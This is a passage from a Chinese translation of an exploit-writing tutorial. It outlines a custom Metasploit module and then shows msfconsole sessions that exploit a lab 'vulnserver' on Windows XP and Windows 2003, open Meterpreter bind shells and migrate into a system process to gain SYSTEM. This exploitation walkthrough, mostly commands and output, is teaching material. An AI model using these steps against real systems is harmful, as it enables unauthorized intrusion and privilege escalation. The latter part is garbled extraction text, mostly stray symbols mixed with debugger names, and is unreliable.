►Payload：定义badchars的长度（在本例为0x00和0xff）
►定义targets，以及target特有的设置，如return address,offset等等
►Exploit
►connect (设置远程连接端口)
►创建缓冲区
►junk(nops,offset size)
►添加返回地址，nops以及编码的payload
►写入连接的缓冲区
►处理exploit
►断开连接
现在打开msfconsole，如果存在脚本错误，那么当msfconsole加载时将显示相关的错误信息。如果msfconsole已
加载，那么你必须在使用此新module前将msfconsole关掉(或者刷新模块，如果你对其进行修改的话)。
测试exploit
Test 1 : Windows XP SP3
root@backtrack4:/pentest/exploits/framework3# ./msfconsole
| | _) |
__ `__ \ _ \ __| _` | __| __ \ | _ \ | __|
| | | __/ | ( |\__ \ | | | ( | | |
_| _| _|\___|\__|\__,_|____/ .__/ _|\___/ _|\__|
_|
=[ msf v3.3-dev
+ -- --=[ 395 exploits - 239 payloads
+ -- --=[ 20 encoders - 7 nops
=[ 187 aux
msf > use windows/misc/custom_vulnserver
msf exploit(custom_vulnserver) > show options
Module options:
Name Current Setting Required Description
---- --------------- -------- -----------
RHOST yes The target address
RPORT 200 yes The target port
Exploit target:
Id Name
-- ----
0 Windows XP SP3 En
msf exploit(custom_vulnserver) > set rhost 192.168.24.10
rhost => 192.168.24.10
msf exploit(custom_vulnserver) > show targets
Exploit targets:
Id Name
-- ----
0 Windows XP SP3 En
1 Windows 2003 Server R2 SP2
msf exploit(custom_vulnserver) > set target 0
target => 0
msf exploit(custom_vulnserver) > set payload windows/meterpreter/bind_tcp
payload => windows/meterpreter/bind_tcp
msf exploit(custom_vulnserver) > show options
Module options:
Name Current Setting Required Description
---- --------------- -------- -----------
RHOST 192.168.24.10 yes The target address
RPORT 200 yes The target port
Payload options (windows/meterpreter/bind_tcp):
Name Current Setting Required Description
---- --------------- -------- -----------
EXITFUNC process yes Exit technique: seh, thread, process
LPORT 4444 yes The local port
RHOST 192.168.24.10 no The target address
Exploit target:
Id Name
-- ----
0 Windows XP SP3 En
msf exploit(custom_vulnserver) > exploit
[*] Started bind handler
[*] Transmitting intermediate stager for over-sized stage...(216 bytes)
[*] Sending stage (718336 bytes)
[*] Meterpreter session 1 opened (192.168.24.1:42150 -> 192.168.24.10:4444)
meterpreter > sysinfo
Computer: SPLOITBUILDER1
OS : Windows XP (Build 2600, Service Pack 3).
Test 2 : Windows 2003 Server R2 SP2
meterpreter >
meterpreter > quit
[*] Meterpreter session 1 closed.
msf exploit(custom_vulnserver) > set rhost 192.168.24.3
rhost => 192.168.24.3
msf exploit(custom_vulnserver) > set target 1
target => 1
msf exploit(custom_vulnserver) > show options
Module options:
Name Current Setting Required Description
---- --------------- -------- -----------
RHOST 192.168.24.3 yes The target address
RPORT 200 yes The target port
Payload options (windows/meterpreter/bind_tcp):
Name Current Setting Required Description
---- --------------- -------- -----------
EXITFUNC process yes Exit technique: seh, thread, process
LPORT 4444 yes The local port
RHOST 192.168.24.3 no The target address
Exploit target:
Id Name
-- ----
1 Windows 2003 Server R2 SP2
msf exploit(custom_vulnserver) > exploit
[*] Started bind handler
[*] Transmitting intermediate stager for over-sized stage...(216 bytes)
[*] Sending stage (718336 bytes)
[*] Meterpreter session 2 opened (192.168.24.1:56109 -> 192.168.24.3:4444)
meterpreter > sysinfo
Computer: WIN2003-01
OS : Windows .NET Server (Build 3790, Service Pack 2).
meterpreter > getuid
Server username: WIN2003-01\Administrator
meterpreter > ps
Process list
============
PID Name Path
--- ---- ----
300 smss.exe \SystemRoot\System32\smss.exe
372 winlogon.exe \??\C:\WINDOWS\system32\winlogon.exe
396 Explorer.EXE C:\WINDOWS\Explorer.EXE
420 services.exe C:\WINDOWS\system32\services.exe
424 ctfmon.exe C:\WINDOWS\system32\ctfmon.exe
432 lsass.exe C:\WINDOWS\system32\lsass.exe
652 svchost.exe C:\WINDOWS\system32\svchost.exe
832 svchost.exe C:\WINDOWS\System32\svchost.exe
996 spoolsv.exe C:\WINDOWS\system32\spoolsv.exe
1132 svchost.exe C:\WINDOWS\System32\svchost.exe
1392 dllhost.exe C:\WINDOWS\system32\dllhost.exe
1580 svchost.exe C:\WINDOWS\System32\svchost.exe
1600 svchost.exe C:\WINDOWS\System32\svchost.exe
2352 cmd.exe C:\WINDOWS\system32\cmd.exe
2888 vulnserver.exe C:\vulnserver\lcc\vulnserver.exe
meterpreter > migrate 996
[*] Migrating to 996...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
关于Metasploit API的更多信息
关于Metasploit API的更多信息可以查看以下链接：
http://www.metasploit.com/documents/api/msfcore/index.html
Exploit exploit
Peter Van Eeckhoutte
riusksk http://riusksk.blogbus.com  
                      ! " # $ % &  ’ ( ) $ * +  , - . / 0 2 3
Windbg exploit  1
 4 5 6 7 8 9   ’ : ; ,  ?
exploit  1
/ 0 $ B EC D F G H 
exploit @ A
K  L
I 
windbg (Windbg http://windbg.info/doc/1-common-cmds.html ) J
I
ollydbg
I
immunity debugger( python) M
I
metasploit
O P Q R    S T U    9 V W X Y $ X Z [    \ ,   2 ] B C  2 
I
pyDbg ( python Gray Hay Python N  ^ _
 ‘  H a b c d
)
 B C  f
I
perl /python e N g g
 h i $ j k    l m n   o  p T q r s t v w x ’ : ; $ y   9 \ , z { |   ! " 
windbg windbg u 
S } ~ |  ! "   C \ -    2 ] : ; \ ,       |
MSEC http://www.codeplex.com/msecdbg MSEC A    1 
        o .   9 | ,\       % &   )  S      \ -  $    ¡ ¢ £ ⁄ ¥  2 ƒ §
  1
p ¤ ' 
1
Byakugan : introduction, pattern_offset and searchOpcode
“ « ‹ › fi fl H  « : ; – i †  5 r 8  ]‡ : ;   H  · X Y $ : ; v w x $  ¶ • ‚ 
Ollydbg windbg / /API MSEC   u
„  8  ”  » »  … h     ¶ S ¿  t X Y $ : ;  ` ´ 
Metasploit windbg byakugan Windows XP SP2,SP3,Vista ‰ 1
ˆ • ‚ $ ˜ /  $ ¯ ˘ ˙ 4 ; ,\ 4 ; ¨    \  o   „
windows 7 framework3 svn   ˚ ¸  ˝ ˛ 
—  – 5 ’   4 ; ¨  S  4 ; ¨ 
\external\source\byakugan\bin byakugan.dll injectsu.dll windbg winext ˇ  1     
 5  —
detoured.dll c:\windows\system32   ˇ  1
-  ´  x  
byakugan.dll
I   · B  C \    * &     Z ! " # \  ˙ $ Æ  , ’   H ª $    
jutsu
I
pattern_offset
 Ł Ø§ ˆ Œ §o  º  $ • ‚
I
mushishi  
$• ‚ (    
I
tenketsu vista /  
. æ  $ Æ  9  V  ]  ı    $     .  ł Æ $   ø œ
Injectsu.dll hook API ˇ    1